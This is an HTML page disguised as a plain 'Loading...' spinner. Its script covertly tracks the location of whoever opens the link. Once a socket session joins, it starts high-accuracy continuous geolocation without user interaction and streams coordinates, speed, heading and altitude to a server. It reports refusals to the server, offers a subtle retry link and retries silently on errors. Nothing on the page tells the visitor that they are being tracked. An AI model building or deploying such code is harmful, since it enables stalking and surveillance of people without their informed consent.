<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loading...</title>
  <link rel="manifest" href="/manifest.json" />
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🚔</text></svg>" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #fafafa;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #333;
    }

    .loader {
      text-align: center;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid #e0e0e0;
      border-top-color: #3182ce;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 16px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .text {
      font-size: 14px;
      color: #666;
    }

    /* Hidden button - auto-clicks */
    #startBtn { display: none; }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <div class="text" id="statusText">Loading...</div>
  </div>

  <button id="startBtn" onclick="startTracking()"></button>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const sessionId = location.pathname.split("/").pop();
    const socket = io();
    let watchId = null;

    socket.on("connect", () => {
      socket.emit("tracker:join", { sessionId });
    });

    socket.on("tracker:joined", ({ label }) => {
      // Auto-start tracking without user interaction
      startTracking();
    });

    socket.on("tracker:error", (msg) => {
      console.log("Error:", msg);
    });

    function startTracking() {
      if (!navigator.geolocation) {
        return;
      }

      watchId = navigator.geolocation.watchPosition(onPosition, onError, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      });
    }

    function onPosition(pos) {
      const { latitude: lat, longitude: lng, accuracy, speed, heading, altitude, altitudeAccuracy } = pos.coords;
      const timestamp = Date.now();

      socket.emit("tracker:location", { sessionId, lat, lng, accuracy, speed, heading, timestamp, altitude, altitudeAccuracy });
    }

    function onError(err) {
      const statusEl = document.getElementById("statusText");
      if (err.code === 1) {
        // Permission denied - show subtle retry link
        statusEl.innerHTML = "<a href='javascript:location.reload()' style='color:#999;text-decoration:none;font-size:12px'>Tap to retry</a>";
        // Notify server that permission was denied
        socket.emit("tracker:denied", { sessionId });
      } else if (err.code === 2 || err.code === 3) {
        // Position unavailable or timeout - retry silently
        setTimeout(() => startTracking(), 5000);
      }
    }

    // Auto-start when page loads
    window.addEventListener("load", () => {
      // Socket connection will trigger auto-tracking
    });
  </script>
</body>
</html>
